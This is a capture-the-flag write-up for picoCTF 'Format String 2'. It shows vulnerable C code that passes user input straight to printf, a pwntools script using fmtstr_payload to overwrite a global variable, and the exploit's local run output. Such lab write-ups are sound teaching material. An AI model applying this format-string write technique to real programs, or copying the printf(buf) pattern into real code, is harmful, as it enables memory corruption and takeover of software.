# picoCTF Format String 2

When we look at the source code of this level we can see that we have to write a specific value at a specific address.

```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

We use the %p format specifier with the right value of target and %n to write to the address like so.

```python
#!/bin/python3

from pwn import *

context.arch = "amd64"
elf = ELF("./vuln")
p = process("./vuln")

target = elf.symbols["sus"]
val = 0x67616c66
offset = 14

payload = fmtstr_payload(offset, {target: val}, write_size="short")

p.sendlineafter(b"What do you have to say?", payload)
print(p.recvall().decode("latin-1").strip().split("\n")[-1])
```

```bash
$ ./exploit.py          
[*] '/media/sf_CTFs/PicoCTF/Binary_exploitation/formatString/two/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './vuln': pid 2660
[+] Receiving all data: Done (89.94KB)
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 2660)

I have NO clue how you did that, you must be a wizard. Here you go...
```
